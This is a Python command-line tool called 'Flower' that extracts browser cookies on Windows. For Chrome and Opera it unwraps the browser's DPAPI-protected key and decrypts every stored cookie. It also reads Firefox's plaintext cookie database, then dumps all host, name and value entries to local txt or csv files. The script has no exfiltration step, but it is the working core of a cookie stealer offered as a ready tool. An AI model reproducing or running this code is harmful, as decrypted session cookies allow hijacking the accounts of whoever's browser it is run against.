import colorama
import sys
import json
import os
import base64
import win32crypt
import sqlite3
from Crypto.Cipher import AES

colorama.init(True)

version = 0.1


print(colorama.Fore.GREEN + """
$ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ 
$   _____.__                                $
$ _/ ____\  |   ______  _  __ ___________   $
$ \   __\|  |  /  _ \ \/ \/ // __ \_  __ \\  $
$  |  |  |  |_(  <_> )     /\  ___/|  | \/  $
$  |__|  |____/\____/ \/\_/  \___  >__|     $
$                                \/         $
$ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $ $
""")
print(f"- Build of Flower: {colorama.Fore.GREEN}{version}\n")

is_chrome_used = "-chrome" in sys.argv
is_firefox_used = "-firefox" in sys.argv
is_opera_used = "-opera" in sys.argv

# Few allowed write types:
# 1. txt
# 2. csv
save_type = sys.argv[sys.argv.index("-type") + 1]

user_login = os.getlogin()
chrome_path = f"C:\\Users\\{user_login}\\AppData\\Local\\Google\\Chrome\\"
firefox_path = f"C:\\Users\\{user_login}\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles"
opera_path = f"C:\\Users\\{user_login}\\AppData\\Roaming\\Opera Software\\Opera Stable\\"

def Collect_Chrome():
    out = []

    if(os.path.exists(chrome_path)):
        key_json = os.path.join(chrome_path, "User Data", "Local State")
        with open(key_json, "r") as file:
            json_obj = json.loads(file.read())
            encrypted_key = json_obj["os_crypt"]["encrypted_key"]

            encrypted_key_base64 = base64.b64decode(encrypted_key.encode("utf-8"))
            encryption_key = win32crypt.CryptUnprotectData(encrypted_key_base64[5:])

        db_path = os.path.join(chrome_path, "User Data", "Default", "Network", "Cookies")
        connection = sqlite3.connect(db_path)

        cursor = connection.cursor()
        cursor.execute("SELECT host_key, name, encrypted_value FROM 'cookies';")

        for host, name, encrypted_val in cursor.fetchall():
            nonce = encrypted_val[3:15]
            ciphertext_tag = encrypted_val[15:len(encrypted_val) - 16]
            cipher = AES.new(key = encryption_key[1], mode = AES.MODE_GCM, nonce = nonce)

            out.append({
                "host": host,
                "name": name,
                "value": cipher.decrypt(ciphertext_tag).decode("utf-8")
            })

        cursor.close()
        connection.close()

    return out


def Collect_Firefox():
    out = []

    # Searching for needed profile folder
    for file in os.listdir(firefox_path):
        if(file.endswith("release")):
            db_path = os.path.join(firefox_path, file, "cookies.sqlite")
            connection = sqlite3.connect(db_path)

            cursor = connection.cursor()
            cursor.execute("SELECT name, value, host FROM 'moz_cookies';")

            for name, value, host in cursor.fetchall():
                # Because Firefox doesn't have any cookie encryption, we don't need to decrypt it. Simply put it to output array

                out.append({
                    "host": host,
                    "name": name,
                    "value": value
                })
    
            cursor.close()
            connection.close()

    return out

def Collect_Opera():
    out = []

    if(os.path.exists(opera_path)):
        with open(os.path.join(opera_path, "Local State"), "r") as file:
            json_obj = json.loads(file.read())
            encrypted_key = json_obj["os_crypt"]["encrypted_key"]
            encrypted_key_base64 = base64.b64decode(encrypted_key)[5:]
            key = win32crypt.CryptUnprotectData(encrypted_key_base64)[1]

        connection = sqlite3.connect(os.path.join(opera_path, "Network", "Cookies"))
        cursor = connection.cursor()

        cursor.execute("SELECT host_key, name, encrypted_value FROM 'cookies';")

        for host_key, name, encrypted_val in cursor.fetchall():
            nonce = encrypted_val[3:15]
            val = encrypted_val[15:-16]

            cipher = AES.new(key = key, mode = AES.MODE_GCM, nonce = nonce)
            out.append({
                "host": host_key,
                "name": name,
                "value": cipher.decrypt(val).decode("utf-8")
            })
            
        cursor.close()
        connection.close()
    
    return out

def WriteCookies(name, storage):
    out = ""

    match save_type:
        case "txt":
            for data in storage:
                host = data["host"]
                name2 = data["name"]
                value = data["value"]

                out += f"{host} | {name2} | {value}\n"
        case "csv":
            out += "Host, Name, Value\n\n"
            for data in storage:
                host = data["host"]
                name2 = data["name"]
                value = data["value"]

                out += f"{host}, {name2}, {value}\n"
        case _:
            print(f"{colorama.Fore.RED}bro selected unknown output type :skull:")
            exit()

    with open(f"{name}.{save_type}", "w") as file:
        file.write(out)

if(is_chrome_used):
    extracted_cookies = Collect_Chrome()
    WriteCookies("Chrome", extracted_cookies)

    print(f"{colorama.Fore.GREEN}[-] Total Chrome cookies: {colorama.Fore.WHITE}{len(extracted_cookies)}")

if(is_firefox_used):
    extracted_cookies = Collect_Firefox()
    WriteCookies("Firefox", extracted_cookies)

    print(f"{colorama.Fore.GREEN}[-] Total Firefox cookies: {colorama.Fore.WHITE}{len(extracted_cookies)}")

if(is_opera_used):
    extracted_cookies = Collect_Opera()
    WriteCookies("Opera", extracted_cookies)

    print(f"{colorama.Fore.GREEN}[-] Total Opera cookies: {colorama.Fore.WHITE}{len(extracted_cookies)}")
